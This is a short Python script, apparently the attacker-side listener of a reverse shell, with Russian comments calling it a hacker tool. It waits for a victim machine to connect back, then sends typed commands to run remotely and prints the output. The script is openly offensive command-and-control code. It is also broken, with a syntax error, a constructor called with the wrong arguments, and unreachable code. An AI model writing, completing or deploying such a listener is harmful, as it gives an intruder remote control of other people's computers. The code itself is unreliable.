import socket, json
#Хакер
class Listener:
	def __init__(self, ip, port):
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		listener.bind((ip, port)) 
		listener.listen(0)
		print('[*] Waiting for incoming connections')
		self.connection, address = listener.accept()
		print('[*] got a connection from' + str(address))

	def reliable_send(self, data):
		json_data = json.dumps(data):
		self.connection.send(json_data)

	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue

	def execute_remotely(self, command):
		self.connection.send(command)
		if command[0] == "exit":
			self.connection.close()
			exit()
		
		return self.reliable_receive()

		return self.connection.recv(1024)
	def go(self):
		while True:
			command = input("~#")
			command = command.split(" ")
			result = self.execute_remotely(command)
			print(result)
my_listener = Listener('Введите IP, 4444')  #ip  хакера и лбой порт 4444 8080 и т.д Обезательно!
my_listener.go()
